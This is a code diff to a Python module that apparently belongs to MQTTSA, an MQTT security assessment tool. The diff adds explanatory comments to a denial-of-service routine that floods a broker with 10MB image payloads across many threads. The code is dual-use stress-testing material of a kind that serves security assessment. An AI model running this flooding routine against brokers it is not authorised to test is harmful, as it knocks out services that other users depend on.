@@ -4,10 +4,12 @@ import time
 from multiprocessing import Process
 import paho.mqtt.client as mqtt
 
+# this function is called from the threaded_broker_dos one, which handles the creation of threads
 def broker_dos(host, port, connections, topic="", tls_cert=None, client_cert=None):
     client = mqtt.Client()
 
-    f= open("dos/tree.jpg", 'rb')
+    # here we load an image (10MB) in the payload of the message to try exhausting broker's resources
+    f= open("tree.jpg", 'rb')
     filecontent = f.read()
     byteArr = bytearray(filecontent)
 
@@ -38,12 +40,14 @@ def broker_dos(host, port, connections, topic="", tls_cert=None, client_cert=Non
         except:
             pass
 
+# this is the actual function called from MQTTSA, which will handle threads, and for each threads the function broker_dos will be called
 def threaded_broker_dos(host, port, threads, connections, topic="", tls_cert=None, client_cert=None):
     # an array containing all the threads we'll create
     ts = []
     # we create a number of threads equal to the threads parameter
     for i in range(int(threads)):
         try:
+            # here we call the broker_dos function, one for each thread
             th = threading.Thread(target=broker_dos, args=(host, port, connections, topic, tls_cert, client_cert), name="User-" + str(1))
             # thread dies if it exits!
             th.Daemon = True
